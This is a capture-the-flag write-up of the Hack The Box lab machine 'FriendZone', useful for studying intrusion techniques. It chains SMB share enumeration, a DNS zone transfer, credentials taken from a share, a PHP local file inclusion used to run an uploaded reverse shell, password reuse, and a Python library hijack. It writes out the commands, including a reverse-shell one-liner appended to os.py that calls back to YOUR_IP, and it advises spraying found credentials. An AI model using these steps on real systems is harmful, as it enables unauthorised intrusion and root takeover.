HTB FriendZone

Box: FriendZone (Easy)
IP: 10.129.94.187
OS: Ubuntu, Apache, Samba
Stack: PHP, MySQL, Python

Enumeration

Nmap: FTP (21), SSH (22), DNS (53), HTTP (80), HTTPS (443), SMB (139/445).

SMB shares (null auth, guest access):

    print$         — Printer Drivers
    Files          — /etc/Files (READ)
    general        — READ
    Development    — READ,WRITE
    IPC$

The share remarks reveal the filesystem mapping: Files is at /etc/Files, which means other shares likely live under /etc/ too (Development → /etc/Development/).

SMB signing is off. Null auth works.

SSL certificate (port 443) leaked the domain: friendzone.red (CN), haha@friendzone.red (email).

DNS Zone Transfer

    dig axfr friendzone.red @10.129.94.187

Returned subdomains:
    administrator1.friendzone.red
    hr.friendzone.red
    uploads.friendzone.red

All added to /etc/hosts pointing at 10.129.94.187.

Credentials from SMB

Connected to the general share and found creds.txt:

    smbclient //10.129.94.187/general -N
    get creds.txt

Contents: admin:WORKWORKHhallelujah@#

These creds worked on https://administrator1.friendzone.red to log in to the admin panel.

LFI on Dashboard

After logging in, redirected to dashboard.php with parameters:

    https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=

The pagename parameter is vulnerable to Local File Inclusion. The PHP backend does include($pagename . ".php"), auto-appending .php to whatever you provide.

Confirmed by setting pagename=login which included login.php and showed "Wrong !" (the login page's error).

The error message "the script include wrong param" was a direct hint that include() is being used.

SMB Write + LFI = RCE

The attack chain: upload a PHP reverse shell to the Development SMB share (writable), then include it via the LFI since Development maps to /etc/Development/.

Step 1: Upload reverse shell

    cp /usr/share/webshells/php/php-reverse-shell.php /tmp/shell.php
    # Edit IP and port in shell.php
    smbclient //10.129.94.187/Development -N -c 'put /tmp/shell.php shell.php'

Step 2: Start listener

    nc -lvnp 4444

Step 3: Trigger LFI to include the uploaded shell

    https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/shell

Shell as www-data.

Lateral Movement to Friend

Found MySQL credentials in a PHP config file on the box:

    db_user=friend
    db_pass=Agpyu12!0.213$
    db_name=FZ

Password reuse: Agpyu12!0.213$ works for SSH as the friend user.

    ssh friend@10.129.94.187

Also found a script with email credentials:

    mailsend -user you -pass "PAPAP"

User flag obtained.

Privilege Escalation: Python Library Hijacking

Used pspy to monitor processes and found root running a cron job:

    /opt/server_admin/reporter.py

This Python script imports the os module. The key vulnerability: /usr/lib/python2.7/os.py is world-writable.

Python resolves imports by searching paths in sys.path order. When root's cron runs reporter.py and it does import os, Python loads /usr/lib/python2.7/os.py. Since we can write to that file, we inject a reverse shell payload.

Step 1: Add reverse shell to os.py

    echo 'import socket,subprocess;s=socket.socket();s.connect(("YOUR_IP",5555));subprocess.call(["/bin/bash","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())' >> /usr/lib/python2.7/os.py

Step 2: Start listener

    nc -lvnp 5555

Step 3: Wait for cron to execute reporter.py as root. Shell as root.

Key Takeaways

1. SMB share remarks leak filesystem paths. "FriendZone Samba Server Files /etc/Files" told us exactly where shares are mounted. Always read the full share description.

2. Zone transfers give you the full subdomain map. One dig axfr command revealed three subdomains including the admin panel. Always try zone transfers when port 53 is open.

3. LFI + write access = RCE. LFI alone lets you read files. But if you can write anywhere on the filesystem (SMB, file upload, log poisoning), LFI becomes code execution. The mindset shift: you create the file to include, you don't just look for existing ones.

4. pagename, page, file, include, template are all LFI red flags. Any parameter that loads content by name should be tested for file inclusion immediately.

5. Password reuse across services. DB creds (friend:Agpyu12!0.213$) worked for SSH. Admin creds came from a file on an open SMB share. Always spray found creds across all services.

6. Python library hijacking. If a privileged script imports a module and you can write to that module's .py file, you get code execution as that user. Check: find writable Python files with find / -name "*.py" -writable 2>/dev/null, then check if any privileged process imports from those files.

7. Content-Type matters for encoding. The admin panel sent data as application/x-www-form-urlencoded, not raw XML or JSON. Always match the original request format.
